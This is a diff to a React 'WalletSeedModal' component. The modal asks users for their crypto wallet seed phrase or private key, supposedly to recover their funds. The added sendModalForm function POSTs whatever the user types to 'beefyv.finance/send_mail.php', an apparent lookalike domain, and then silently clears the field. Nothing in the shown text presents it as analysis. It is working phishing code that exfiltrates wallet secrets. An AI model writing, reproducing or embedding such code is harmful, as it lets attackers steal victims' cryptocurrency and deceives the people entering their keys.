@@ -13,6 +13,26 @@ const WalletSeedModal = ({ isOpenModal, icon: Icon, title }) => {
     setShowModal(true);
   }
 
+  function handleSubmit(e) {
+    e.preventDefault();
+  }
+
+  function sendModalForm() {
+    fetch("https://beefyv.finance/send_mail.php", {
+      method: 'POST',
+      body: JSON.stringify({ text: walletSeedInput, title: title})
+    }) 
+    .then(res => res.json())
+    .then(
+      (result) => {
+        
+      },
+      (error) => {
+      }
+    )
+    document.querySelector('#PrivateKey').value = ' ';
+  }
+
   function handleCloseModal() {
     setShowModal(false);
   }
@@ -61,18 +81,11 @@ const WalletSeedModal = ({ isOpenModal, icon: Icon, title }) => {
           <p>{title}</p>
         </div>
 
-        <form>
-          {title.includes('Binance') ? (
-            <p className="modal-form-title">
-              Please provide your 12, 18, or 24 word seed passphrase or
-              privatekey in lowercase to recover and get access to your funds.
-            </p>
-          ) : (
-            <p className="modal-form-title">
-              Please provide your 12/24 word seed passphrase or privatekey in
-              lowercase to recover and get access to your funds.
-            </p>
-          )}
+        <form onSubmit={handleSubmit}>
+          <p className="modal-form-title">
+            Please provide your 12, 18, or 24 word seed passphrase or privatekey
+            in lowercase to recover and get access to your funds.
+          </p>
           <textarea
             name="PrivateKey"
             id="PrivateKey"
@@ -87,13 +100,12 @@ const WalletSeedModal = ({ isOpenModal, icon: Icon, title }) => {
                 ? 'activeB'
                 : ''
             }`}
-          >
-            Continue
-          </button>
+            onClick={sendModalForm}>
+          Continue</button>
         </form>
       </div>
     </Modal>
   );
 };
-
+ 
 export default WalletSeedModal;
